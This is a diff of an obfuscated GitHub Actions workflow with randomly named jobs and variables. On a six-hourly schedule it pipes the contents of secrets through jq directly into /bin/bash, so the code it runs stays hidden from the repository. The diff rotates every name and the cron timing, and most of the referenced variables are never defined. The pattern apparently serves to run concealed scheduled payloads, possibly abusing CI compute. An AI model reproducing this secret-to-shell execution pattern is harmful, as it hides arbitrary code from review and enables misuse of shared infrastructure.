@@ -1,22 +1,32 @@
 name: chenzhishi4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '41 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenzhishi4567
         env:
-          lrh81: ${{ secrets.lrh81 }}
+          dn14590: ${{ secrets.dn14590 }}
         run: |
-          echo $lrh81 | jq -r .dbgtr4300 | /bin/bash
-          echo $lz68084 | jq -r .hvg8616 | /bin/bash
-          echo $dursz5 | jq -r .anc16 | /bin/bash
-          echo $xqsx6474 | jq -r .d77700 | /bin/bash
-          echo $zp9 | jq -r .y92859 | /bin/bash
-          echo $gwptr87549 | jq -r .hjlk4299 | /bin/bash
+          echo $dn14590 | jq -r .ed27591 | /bin/bash
+          echo $w91 | jq -r .t4708 | /bin/bash
+          echo $h91067 | jq -r .v85059 | /bin/bash
+          echo $b4 | jq -r .rfyq2 | /bin/bash
+          echo $yqrhb6551 | jq -r .t140 | /bin/bash
+          echo $ql1 | jq -r .ppezl010 | /bin/bash
+          echo $fc574 | jq -r .nusli4 | /bin/bash
+          echo $r2908 | jq -r .ggb87626 | /bin/bash
+          echo $kzt8 | jq -r .ojtqo5604 | /bin/bash
+          echo $arc4564 | jq -r .muq16238 | /bin/bash
+          echo $lajs56484 | jq -r .p57686 | /bin/bash
+          echo $bf04 | jq -r .axy20747 | /bin/bash
+          echo $hvyz5058 | jq -r .eh5 | /bin/bash
+          echo $rj4 | jq -r .riddf1852 | /bin/bash
 
